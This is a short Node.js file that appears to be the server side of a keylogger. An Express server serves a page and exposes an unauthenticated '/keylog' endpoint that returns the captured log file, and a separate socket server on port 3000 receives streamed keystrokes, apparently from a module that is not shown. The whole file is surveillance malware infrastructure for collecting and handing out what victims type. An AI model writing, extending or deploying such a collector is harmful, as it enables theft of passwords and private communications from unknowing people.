const path = require('path');
const { readFileSync } = require('fs');

const express = require('express');
const app = express();

const netServer = require('./servers/net');

app.use('/', express.static(path.join(__dirname + '/public')));//<--Sends page
app.get('/keylog', (req, res) => { res.send(readLogs()) });//<--Endpoint to GET the logs

readLogs = _ => readFileSync('./keylog.txt', 'utf-8');//<--This anf reads and returns the logs on keylog.txt

app.listen(8080);//<--Express server (delivers page and has endpoint)
netServer.listen(3000);//<--Net server (listen socket streaming)